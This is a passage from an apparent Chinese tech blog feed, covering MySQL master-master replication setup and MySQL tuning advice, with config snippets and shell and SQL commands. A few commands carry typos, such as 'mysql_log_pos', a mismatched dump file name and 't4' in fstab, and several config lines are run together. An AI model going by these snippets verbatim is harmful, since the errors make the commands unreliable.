id="&#x7EC3;&#x4E60;&#xFF1A;1-&#x914D;&#x7F6E;&#x4E92;&#x4E3A;&#x4E3B;&#x4ECE;-2-&#x5148;&#x914D;&#x7F6E;&#x5E38;&#x89C4;&#x4E3B;&#x4ECE;&#xFF0C;&#x7136;&#x540E;&#x589E;&#x52A0;&#x4E00;&#x53F0;&#x4ECE;&#x5E93;"><a href="#&#x7EC3;&#x4E60;&#xFF1A;1-&#x914D;&#x7F6E;&#x4E92;&#x4E3A;&#x4E3B;&#x4ECE;-2-&#x5148;&#x914D;&#x7F6E;&#x5E38;&#x89C4;&#x4E3B;&#x4ECE;&#xFF0C;&#x7136;&#x540E;&#x589E;&#x52A0;&#x4E00;&#x53F0;&#x4ECE;&#x5E93;" class="headerlink" title="&#x7EC3;&#x4E60;&#xFF1A;1. &#x914D;&#x7F6E;&#x4E92;&#x4E3A;&#x4E3B;&#x4ECE;  2. &#x5148;&#x914D;&#x7F6E;&#x5E38;&#x89C4;&#x4E3B;&#x4ECE;&#xFF0C;&#x7136;&#x540E;&#x589E;&#x52A0;&#x4E00;&#x53F0;&#x4ECE;&#x5E93;"></a>&#x7EC3;&#x4E60;&#xFF1A;1. &#x914D;&#x7F6E;&#x4E92;&#x4E3A;&#x4E3B;&#x4ECE;  2. &#x5148;&#x914D;&#x7F6E;&#x5E38;&#x89C4;&#x4E3B;&#x4ECE;&#xFF0C;&#x7136;&#x540E;&#x589E;&#x52A0;&#x4E00;&#x53F0;&#x4ECE;&#x5E93;</h2><p>&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;  </p><p>master_1:</p><pre><code>bind-address    = 0.0.0.0   # &#x542F;&#x7528;&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;log-bin=mysql-bin   # &#x6B65;&#x8FDB;&#x503C;&#xFF0C;&#x5982;&#x679C;&#x6709;n&#x53F0;master&#xFF0C;&#x5C31;&#x586B;n&#xFF1A;auto_increment_increment=2# &#x8D77;&#x59CB;&#x503C;&#xFF0C;&#x4E00;&#x822C;&#x586B;&#x7B2C;n&#x53F0;master&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x7B2C;1&#x53F0;&#x4E3B;MySQLauto_increment_offset=1server-id=1lower_case_table_names=1</code></pre><p>master_2:</p><pre><code>auto_increment_increment=2auto_increment_offset=2log-bin=mysql-binbinlog_format=mixedserver-id=2lower_case_table_names=1</code></pre><p># &#x5BFC;&#x51FA;&#x6570;&#x636E;&#x5230;master_2<br>master_1:</p><pre><code>mysqldump -uroot -p -A &gt; all_db.sqlscp all_db.sql master_2_user@master_2_ipaddr:~/</code></pre><p>master_2:</p><pre><code>mysql -uroot -p &lt; all.db.sql</code></pre><p># &#x8BB0;&#x5F55;bin-log&#x6587;&#x4EF6;&#x8DDF;&#x4F4D;&#x7F6E;&#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x6388;&#x6743;&#x7ED9;&#x5BF9;&#x65B9;</p><p>#&#x4F8B;&#x5982;&#xFF1A;<br>master_1:</p><pre><code>show master status;</code></pre><p>#&#x5C06;&#x81EA;&#x5DF1;&#x7684;bin-log&#x6587;&#x4EF6;&#x6388;&#x6743;&#x7ED9;&#x5176;&#x4ED6;master&#xFF1A;<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">REPLICATION</span> <span class="keyword">SLAVE</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="keyword">slave</span>@<span class="string">&apos;master_2_ipaddr&apos;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> &#x2018;slave_password&#x2019;;</span><br><span class="line"><span class="keyword">STOP</span> <span class="keyword">SLAVE</span>;</span><br><span class="line"><span class="keyword">CHANGE</span> <span class="keyword">MASTER</span> <span class="keyword">TO</span> master_host=<span class="string">&apos;master_2_ipaddr&apos;</span>,master_user=<span class="string">&apos;slave&apos;</span>,master_password=<span class="string">&apos;slave_password&apos;</span>,master_log_file=<span class="string">&apos;mysql-bin.000005&apos;</span>,master_log_pos=<span class="number">13756331</span>;</span><br><span class="line"><span class="keyword">FLUSH</span> <span class="keyword">PRIVILEGES</span>;</span><br><span class="line"><span class="keyword">START</span> <span class="keyword">SLAVE</span>;</span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">SLAVE</span> <span class="keyword">STATUS</span>\G</span><br></pre></td></tr></tbody></table></figure><p></p><p>master_2:</p><h1 id="&#x5C06;&#x81EA;&#x5DF1;&#x7684;bin-log&#x6587;&#x4EF6;&#x6388;&#x6743;&#x7ED9;&#x5176;&#x4ED6;maser"><a href="#&#x5C06;&#x81EA;&#x5DF1;&#x7684;bin-log&#x6587;&#x4EF6;&#x6388;&#x6743;&#x7ED9;&#x5176;&#x4ED6;maser" class="headerlink" title="&#x5C06;&#x81EA;&#x5DF1;&#x7684;bin-log&#x6587;&#x4EF6;&#x6388;&#x6743;&#x7ED9;&#x5176;&#x4ED6;maser"></a>&#x5C06;&#x81EA;&#x5DF1;&#x7684;bin-log&#x6587;&#x4EF6;&#x6388;&#x6743;&#x7ED9;&#x5176;&#x4ED6;maser</h1><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">REPLICATION</span> <span class="keyword">SLAVE</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="keyword">slave</span>@<span class="string">&apos;master_1_ipaddr&apos;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> &#x2018;slave_password&#x2019;;</span><br><span class="line"><span class="keyword">FLUSH</span> <span class="keyword">PRIVILEGES</span>;</span><br><span class="line"><span class="keyword">STOP</span> <span class="keyword">SLAVE</span>;</span><br><span class="line"><span class="keyword">CHANGE</span> <span class="keyword">MASTER</span> <span class="keyword">TO</span> master_host=<span class="string">&apos;master_1_ipaddr&apos;</span>,master_user=<span class="string">&apos;slave&apos;</span>,master_password=<span class="string">&apos;slave_password&apos;</span>,master_log_file=<span class="string">&apos;mysql-bin.000001&apos;</span>,mysql_log_pos=<span class="number">1022</span>;</span><br><span class="line"><span class="keyword">FLUSH</span> <span class="keyword">PRIVILEGES</span>;</span><br><span class="line"><span class="keyword">START</span> <span class="keyword">SLAVE</span>;</span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">SLAVE</span> <span class="keyword">STATUS</span>\G</span><br></pre></td></tr></tbody></table></figure><p>&#x53C2;&#x8003;&#xFF1A;<a href="https://www.smister.com/post-41/mysql-master-master.html" target="_blank" rel="noopener">https://www.smister.com/post-41/mysql-master-master.html</a></p><p># &#x5728;&#x539F;&#x6709;&#x4E3B;&#x4ECE;&#x4E0A; &#x65B0;&#x589E;&#x4ECE;&#x5E93;</p><p>MySQL&#x4F20;&#x7EDF;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x4E4B;&#x4E0D;&#x505C;&#x673A;&#x91CD;&#x5EFA;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#xFF08;&#x5B9E;&#x6218;&#xFF09;<br><a href="https://note.youdao.com/s/bHvxKKyK" target="_blank" rel="noopener">https://note.youdao.com/s/bHvxKKyK</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x73AF;&amp;#x5883;&quot;&gt;&lt;a href=&quot;#&amp;#x73AF;&amp;#x5883;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x73AF;&amp;#x5883;&quot;&gt;&lt;/a&gt;&amp;#x73AF;&amp;#x5883;&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySQL调优</title>
    <link href="https://marnm.github.io//posts/208cd020/"/>
    <id>https://marnm.github.io//posts/208cd020/</id>
    <published>2022-06-07T04:44:39.000Z</published>
    <updated>2022-06-07T05:13:22.242Z</updated>
    
    <content type="html"><![CDATA[<h3 id="&#x5B66;&#x4E60;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x7684;&#x8FC7;&#x7A0B;&#xFF1A;"><a href="#&#x5B66;&#x4E60;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x7684;&#x8FC7;&#x7A0B;&#xFF1A;" class="headerlink" title="&#x5B66;&#x4E60;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x7684;&#x8FC7;&#x7A0B;&#xFF1A;"></a>&#x5B66;&#x4E60;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x7684;&#x8FC7;&#x7A0B;&#xFF1A;</h3><p>1&#x3001; &#x6B64;&#x670D;&#x52A1;&#x5668;&#x7684;&#x6982;&#x8FF0;&#xFF1A;&#x540D;&#x79F0;&#xFF0C;&#x529F;&#x80FD;&#xFF0C;&#x7279;&#x70B9;&#xFF0C;&#x7AEF;&#x53E3;&#x53F7;<br>2&#x3001; &#x5B89;&#x88C5;<br>3&#x3001; &#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x4F4D;&#x7F6E;<br>4&#x3001; &#x670D;&#x52A1;&#x542F;&#x52A8;&#x5173;&#x95ED;&#x811A;&#x672C;&#xFF0C;&#x67E5;&#x770B;&#x7AEF;&#x53E3;<br>5&#x3001; &#x6B64;&#x670D;&#x52A1;&#x7684;&#x4F7F;&#x7528;&#x65B9;&#x6CD5;<br>6&#x3001; &#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5B9E;&#x6218;&#x4E3E;&#x4F8B;<br>7&#x3001; &#x6392;&#x9519;&#xFF08;&#x4ECE;&#x4E0B;&#x5230;&#x4E0A;&#xFF0C;&#x4ECE;&#x5185;&#x5230;&#x5916;&#xFF09;  </p><h3 id="&#x672C;&#x8282;&#x6240;&#x5B66;&#x5185;&#x5BB9;&#xFF1A;"><a href="#&#x672C;&#x8282;&#x6240;&#x5B66;&#x5185;&#x5BB9;&#xFF1A;" class="headerlink" title="&#x672C;&#x8282;&#x6240;&#x5B66;&#x5185;&#x5BB9;&#xFF1A;"></a>&#x672C;&#x8282;&#x6240;&#x5B66;&#x5185;&#x5BB9;&#xFF1A;</h3><p>&#x2022; &#x8C03;&#x4F18;&#x601D;&#x8DEF;&#xFF1A;<br>&#x2022; 0.&#x786C;&#x4EF6;&#x4F18;&#x5316;<br>&#x2022; 1.&#x6570;&#x636E;&#x5E93;&#x8BBE;&#x8BA1;&#x4E0E;&#x89C4;&#x5212;&#x2013;&#x4EE5;&#x540E;&#x518D;&#x4FEE;&#x6539;&#x5F88;&#x9EBB;&#x70E6;&#xFF0C;&#x4F30;&#x8BA1;&#x6570;&#x636E;&#x91CF;&#xFF0C;&#x4F7F;&#x7528;&#x4EC0;&#x4E48;&#x5B58;&#x50A8;&#x5F15;&#x64CE;<br>&#x2022; 2.&#x6570;&#x636E;&#x7684;&#x5E94;&#x7528;&#x2013;&#x600E;&#x6837;&#x53D6;&#x6570;&#x636E;&#xFF0C;sql &#x8BED;&#x53E5;&#x7684;&#x4F18;&#x5316;<br>&#x2022; 3.&#x78C1;&#x76D8; io &#x4F18;&#x5316;<br>&#x2022; 4.&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7684;&#x4F18;&#x5316;&#x2013;&#x5185;&#x6838;&#x3001;tcp &#x8FDE;&#x63A5;&#x6570;&#x91CF;<br>&#x2022; 5.mysql &#x670D;&#x52A1;&#x4F18;&#x5316;&#x2013;&#x5185;&#x5B58;&#x7684;&#x4F7F;&#x7528;&#xFF0C;&#x78C1;&#x76D8;&#x7684;&#x4F7F;&#x7528;<br>&#x2022; 6.my.cnf &#x5185;&#x53C2;&#x6570;&#x7684;&#x4F18;&#x5316;<br>&#x2022; 7 &#x5206;&#x5E93;&#x5206;&#x8868;&#x601D;&#x8DEF;&#x548C;&#x4F18;&#x52A3;  </p><h3 id="0-&#x786C;&#x4EF6;&#x4F18;&#x5316;"><a href="#0-&#x786C;&#x4EF6;&#x4F18;&#x5316;" class="headerlink" title="0.&#x786C;&#x4EF6;&#x4F18;&#x5316;"></a>0.&#x786C;&#x4EF6;&#x4F18;&#x5316;</h3><p>CPU&#x2014;&#x2014; 64 &#x4F4D;&#x3001;&#x9AD8;&#x4E3B;&#x9891;&#x3001;&#x9AD8;&#x7F13;&#x5B58;&#xFF0C;&#x9AD8;&#x5E76;&#x884C;&#x5904;&#x7406;&#x80FD;&#x529B;<br>&#x5185;&#x5B58;&#x2014;&#x2014;&#x5927;&#x5185;&#x5B58;&#x3001;&#x4E3B;&#x9891;&#x9AD8;&#xFF0C;&#x5C3D;&#x91CF;&#x4E0D;&#x8981;&#x7528; SWAP<br>&#x786C;&#x76D8;&#x2014;&#x2014;15000&#x8F6C;&#x3001;RAID5&#x3001;RAID10 &#x3001; SSD<br>&#x7F51;&#x7EDC;&#x2014;&#x2014;&#x6807;&#x914D;&#x7684;&#x5343;&#x5146;&#x7F51;&#x5361;&#xFF0C;10G&#x7F51;&#x5361;&#xFF0C;bond0&#xFF0C;MySQL&#x670D;&#x52A1;&#x5668;&#x5C3D;&#x53EF;&#x80FD;&#x548C;&#x4F7F;&#x7528;&#x5B83;&#x7684;web&#x670D;&#x52A1;&#x5668;&#x5728;&#x540C;&#x4E00;&#x5C40;&#x57DF;&#x7F51;&#x5185;&#xFF0C;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x8BF8;&#x5982;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x7B49;&#x4E0D;&#x5FC5;&#x8981;&#x7684;&#x5F00;&#x9500;&#x3002;  </p><h3 id="1-&#x6570;&#x636E;&#x5E93;&#x8BBE;&#x8BA1;&#x4E0E;&#x89C4;&#x5212;&#xFF08;&#x67B6;&#x6784;&#x4E0A;&#x7684;&#x4F18;&#x5316;"><a href="#1-&#x6570;&#x636E;&#x5E93;&#x8BBE;&#x8BA1;&#x4E0E;&#x89C4;&#x5212;&#xFF08;&#x67B6;&#x6784;&#x4E0A;&#x7684;&#x4F18;&#x5316;" class="headerlink" title="1.&#x6570;&#x636E;&#x5E93;&#x8BBE;&#x8BA1;&#x4E0E;&#x89C4;&#x5212;&#xFF08;&#x67B6;&#x6784;&#x4E0A;&#x7684;&#x4F18;&#x5316;)"></a>1.&#x6570;&#x636E;&#x5E93;&#x8BBE;&#x8BA1;&#x4E0E;&#x89C4;&#x5212;&#xFF08;&#x67B6;&#x6784;&#x4E0A;&#x7684;&#x4F18;&#x5316;)</h3><p>&#x7EB5;&#x5411;&#x62C6;&#x89E3;: &#x4E13;&#x673A;&#x4E13;&#x7528;<br>&#x4F8B;&#xFF1A;&#x73B0;&#x5728;&#x516C;&#x53F8;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x540C;&#x65F6;&#x8D1F;&#x8D23; web&#x3001;ftp&#x3001;&#x6570;&#x636E;&#x5E93;&#x7B49;&#x591A;&#x4E2A;&#x89D2;&#x8272;&#x3002; R720 dell &#x5185;&#x5B58; &#xFF1A;768G<br>&#x7EB5;&#x5411;&#x62C6;&#x89E3;&#x540E;&#x5C31;&#x662F;&#xFF1A;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x4E13;&#x673A;&#x4E13;&#x7528;&#xFF0C;&#x907F;&#x514D;&#x989D;&#x5916;&#x7684;&#x670D;&#x52A1;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x7684;&#x6027;&#x80FD;&#x4E0B;&#x964D;&#x548C;&#x4E0D;&#x7A33;&#x5B9A;&#x6027;&#x3002; </p><p>&#x6A2A;&#x5411;&#x62C6;&#x89E3;: &#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x3001;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x3001;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x96C6;&#x7FA4;&#xFF0C;&#x5F53;&#x5355;&#x4E2A; mysql &#x6570;&#x636E;&#x5E93;&#x65E0;&#x6CD5;&#x6EE1;&#x8DB3;&#x65E5;&#x76CA;&#x589E;&#x52A0;&#x7684;&#x9700;&#x6C42;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x5728;&#x6570;&#x636E;&#x5E93;&#x8FD9;&#x4E2A;&#x903B;&#x8F91;&#x5C42;&#x9762;&#x589E;&#x52A0;&#x591A;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4EE5;&#x8FBE;&#x5230;&#x7A33;&#x5B9A;&#x3001;&#x9AD8;&#x6548;&#x7684;&#x6548;&#x679C;&#x3002;  </p><h3 id="2&#x3001;&#x67E5;&#x8BE2;&#x4F18;&#x5316;"><a href="#2&#x3001;&#x67E5;&#x8BE2;&#x4F18;&#x5316;" class="headerlink" title="2&#x3001;&#x67E5;&#x8BE2;&#x4F18;&#x5316;"></a>2&#x3001;&#x67E5;&#x8BE2;&#x4F18;&#x5316;</h3><p>a&gt;&#x5EFA;&#x8868;&#x65F6;&#x8868;&#x7ED3;&#x6784;&#x8981;&#x5408;&#x7406;&#xFF0C;&#x6BCF;&#x4E2A;&#x8868;&#x4E0D;&#x5B9C;&#x8FC7;&#x5927;&#xFF1B;&#x5728;&#x4EFB;&#x4F55;&#x60C5;&#x51B5;&#x4E0B;&#x5747;&#x5E94;&#x4F7F;&#x7528;&#x6700;&#x7CBE;&#x786E;&#x7684;&#x7C7B;&#x578B;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x5982;&#x679C;ID&#x5217;&#x7528;int&#x662F;&#x4E00;&#x4E2A;&#x597D;&#x4E3B;&#x610F;&#xFF0C;&#x800C;&#x7528;text&#x7C7B;&#x578B;&#x5219;&#x662F;&#x4E2A;&#x8822;&#x529E;&#x6CD5;&#xFF1B;TIME&#x5217;&#x914C;&#x60C5;&#x4F7F;&#x7528;DATE&#x6216;&#x8005;DATETIME&#x3002;<br>b&gt;&#x7D22;&#x5F15;&#xFF0C;&#x5EFA;&#x7ACB;&#x5408;&#x9002;&#x7684;&#x7D22;&#x5F15;&#x3002;<br>c&gt;&#x67E5;&#x8BE2;&#x65F6;&#x5C3D;&#x91CF;&#x51CF;&#x5C11;&#x903B;&#x8F91;&#x8FD0;&#x7B97;&#xFF08;&#x4E0E;&#x8FD0;&#x7B97;&#x3001;&#x6216;&#x8FD0;&#x7B97;&#x3001;&#x5927;&#x4E8E;&#x5C0F;&#x4E8E;&#x67D0;&#x503C;&#x7684;&#x8FD0;&#x7B97;&#xFF09;&#xFF1B;<br>d&gt;&#x51CF;&#x5C11;&#x4E0D;&#x5F53;&#x7684;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#xFF0C;&#x4E0D;&#x8981;&#x67E5;&#x8BE2;&#x5E94;&#x7528;&#x4E2D;&#x4E0D;&#x9700;&#x8981;&#x7684;&#x5217;&#xFF0C;&#x6BD4;&#x5982;&#x8BF4;select * from &#x7B49;&#x64CD;&#x4F5C;&#x3002;<br>e&gt;&#x51CF;&#x5C0F;&#x4E8B;&#x52A1;&#x5305;&#x7684;&#x5927;&#x5C0F;&#xFF1B;<br>f&gt;&#x5C06;&#x591A;&#x4E2A;&#x5C0F;&#x7684;&#x67E5;&#x8BE2;&#x9002;&#x5F53;&#x5408;&#x5E76;&#x6210;&#x4E00;&#x4E2A;&#x5927;&#x7684;&#x67E5;&#x8BE2;&#xFF0C;&#x51CF;&#x5C11;&#x6BCF;&#x6B21;&#x5EFA;&#x7ACB;/&#x5173;&#x95ED;&#x67E5;&#x8BE2;&#x65F6;&#x7684;&#x5F00;&#x9500;&#xFF1B;<br>g&gt;&#x5C06;&#x67D0;&#x4E9B;&#x8FC7;&#x4E8E;&#x590D;&#x6742;&#x7684;&#x67E5;&#x8BE2;&#x62C6;&#x89E3;&#x6210;&#x591A;&#x4E2A;&#x5C0F;&#x67E5;&#x8BE2;&#xFF0C;&#x548C;&#x4E0A;&#x4E00;&#x6761;&#x6070;&#x597D;&#x76F8;&#x53CD;<br>h&gt;&#x5EFA;&#x7ACB;&#x548C;&#x4F18;&#x5316;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x6765;&#x4EE3;&#x66FF;&#x5927;&#x91CF;&#x7684;&#x5916;&#x90E8;&#x7A0B;&#x5E8F;&#x4EA4;&#x4E92;&#x3002;  </p><h3 id="3&#xFF0C;&#x78C1;&#x76D8;-IO-&#x89C4;&#x5212;&#xFF0C;IO&#x76F8;&#x5173;&#x7684;&#x6280;&#x672F;"><a href="#3&#xFF0C;&#x78C1;&#x76D8;-IO-&#x89C4;&#x5212;&#xFF0C;IO&#x76F8;&#x5173;&#x7684;&#x6280;&#x672F;" class="headerlink" title="3&#xFF0C;&#x78C1;&#x76D8; IO &#x89C4;&#x5212;&#xFF0C;IO&#x76F8;&#x5173;&#x7684;&#x6280;&#x672F;"></a>3&#xFF0C;&#x78C1;&#x76D8; IO &#x89C4;&#x5212;&#xFF0C;IO&#x76F8;&#x5173;&#x7684;&#x6280;&#x672F;</h3><p>RAID &#x6280;&#x672F;&#xFF1A;RAID0&#x6216;RAID10<br>SSD<br>15000&#x8F6C;&#x3001;RAID5&#x3001;RAID10 &#x3001;SSD<br>swap &#x5206;&#x533A;&#xFF1A;&#x6700;&#x597D;&#x4F7F;&#x7528; RAID0 &#x6216; SSD<br>&#x78C1;&#x76D8;&#x5206;&#x533A;&#xFF1A;&#x5C06;&#x6570;&#x636E;&#x5E93;&#x76EE;&#x5F55;&#x653E;&#x5230;&#x4E00;&#x4E2A;&#x5206;&#x533A;&#x4E0A;&#x6216;&#x4E00;&#x4E2A;&#x78C1;&#x76D8;&#x4E0A;&#x7684;&#x7269;&#x7406;&#x5206;&#x533A;&#xFF0C;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x7684;&#x786C;&#x76D8;&#x6216;&#x5206;&#x533A;&#x548C;&#x7CFB;&#x7EDF;&#x6240;&#x5728;&#x7684;&#x786C;&#x76D8;&#x5206;&#x5F00;&#x3002;  </p><p>&#x8BBE;&#x7F6E;&#x4E3B;&#x4ECE;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;binlog&#x65E5;&#x5FD7;&#x9891;&#x7E41;&#x8BB0;&#x5F55;&#x64CD;&#x4F5C;&#xFF0C;&#x5F00;&#x9500;&#x975E;&#x5E38;&#x5927;&#xFF0C;&#x9700;&#x8981;&#x628A;binlog&#x65E5;&#x5FD7;&#x653E;&#x5230;&#x5176;&#x5B83;&#x786C;&#x76D8;&#x5206;&#x533A;&#x4E0A;&#xFF1A;  </p><p>#vim /etc/my.cnf<br>[mysqld]<br>datadir=/data/  #&#x653E;&#x5728;&#x72EC;&#x7ACB;&#x7684;&#x786C;&#x76D8;&#x4E0A;SSD<br>socket=/var/lib/mysql/mysql.sock<br>user=mysql<br># Disabling symbolic-links is recommended to prevent assorted security risks<br>symbolic-links=0  </p><p>#&#x5728;&#x539F;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x6DFB;&#x52A0;&#x4EE5;&#x4E0B;&#x5185;&#x5BB9;&#xFF1A;<br>log-bin=mysql-bin-master #&#x542F;&#x7528;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;<br>server-id=1 #&#x672C;&#x673A;&#x6570;&#x636E;&#x5E93;ID &#x6807;&#x793A;<br>binlog-do-db=db #&#x53EF;&#x4EE5;&#x88AB;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x590D;&#x5236;&#x7684;&#x5E93;&#xFF0C;&#x4E8C;&#x8FDB;&#x5236;&#x9700;&#x8981;&#x540C;&#x6B65;&#x7684;&#x6570;&#x636E;&#x5E93;&#x540D;  </p><h3 id="4-&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7684;&#x4F18;&#x5316;"><a href="#4-&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7684;&#x4F18;&#x5316;" class="headerlink" title="4.&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7684;&#x4F18;&#x5316;"></a>4.&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7684;&#x4F18;&#x5316;</h3><p>&#x7F51;&#x5361; bonding &#x6280;&#x672F;<br>&#x8BBE;&#x7F6E;tcp &#x8FDE;&#x63A5;&#x6570;&#x91CF;&#x9650;&#x5236;&#xFF0C;&#x4F18;&#x5316;&#x7CFB;&#x7EDF;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x7684;&#x6700;&#x5927;&#x9650;&#x5236;&#x3002;<br>&#x4F7F;&#x7528;64&#x4F4D;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#xFF0C;64&#x4F4D;&#x7CFB;&#x7EDF;&#x53EF;&#x4EE5;&#x5206;&#x7ED9;&#x5355;&#x4E2A;&#x8FDB;&#x7A0B;&#x66F4;&#x591A;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x8BA1;&#x7B97;&#x66F4;&#x5FEB; &#x3002;<br>&#x7981;&#x7528;&#x4E0D;&#x5FC5;&#x8981;&#x542F;&#x52A8;&#x7684;&#x670D;&#x52A1;&#x3002;<br>&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x8C03;&#x4F18;&#xFF0C;&#x7ED9;&#x6570;&#x636E;&#x4ED3;&#x5E93;&#x4E00;&#x4E2A;&#x5355;&#x72EC;&#x7684;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF0C;&#x63A8;&#x8350;&#x4F7F;&#x7528;XFS&#xFF0C;&#x4E00;&#x822C;&#x6548;&#x7387;&#x66F4;&#x9AD8;&#x3001;&#x66F4;&#x53EF;&#x9760;&#x3002;<br>ext3 &#x4E0D;&#x9519;&#xFF0C;ext4 &#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x8FC7;&#x6E21;&#x7684;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002;<br>&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x5728;&#x6302;&#x8F7D;&#x5206;&#x533A;&#x65F6;&#x542F;&#x7528; noatime &#x9009;&#x9879;&#x3002; #&#x4E0D;&#x8BB0;&#x5F55;&#x8BBF;&#x95EE;&#x65F6;&#x95F4;<br>&#x6700;&#x5C0F;&#x5316;&#x539F;&#x5219;:<br>                         1&#xFF09;   &#x5B89;&#x88C5;&#x7CFB;&#x7EDF;&#x6700;&#x5C0F;&#x5316;<br>                         2&#xFF09;   &#x5F00;&#x542F;&#x7A0B;&#x5E8F;&#x670D;&#x52A1;&#x6700;&#x5C0F;&#x5316;&#x539F;&#x5219;<br>                         3&#xFF09;   &#x64CD;&#x4F5C;&#x6700;&#x5C0F;&#x5316;&#x539F;&#x5219;<br>                         4&#xFF09;   &#x767B;&#x5F55;&#x6700;&#x5C0F;&#x5316;&#x539F;&#x5219;<br>                         5&#xFF09;   &#x6743;&#x9650;&#x6700;&#x5C0F;&#x5316;  </p><p>&#x4F8B;&#xFF1A;&#x5173;&#x6389;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;atime&#x9009;&#x9879;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# vim /etc/fstab #&#x5728;&#x6302;&#x8F7D;&#x9879;&#x4E2D;&#x6DFB;&#x52A0;noatime&#x9009;&#x9879;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;&#x3002; </span><br><span class="line">UUID=46cb104c-e4dc-4f84-8afc-552f21279c65 /boot t4 defaults,noatime 1 2</span><br><span class="line">[root@jaking ~]# mount #&#x67E5;&#x770B;&#x6DFB;&#x52A0;&#x524D;mount&#x6302;&#x8F7D;&#x9009;&#x9879;</span><br><span class="line">/dev/sda1 on /boot type ext4 (rw) </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x4F7F;&#x8BBE;&#x7F6E;&#x7ACB;&#x5373;&#x751F;&#x6548;&#xFF0C;&#x53EF;&#x8FD0;&#x884C;&#xFF1A; </span></span><br><span class="line">[root@jaking ~]# mount -o remount /boot/ </span><br><span class="line">[root@jaking ~]# mount </span><br><span class="line">/dev/sda1 on /boot type ext4 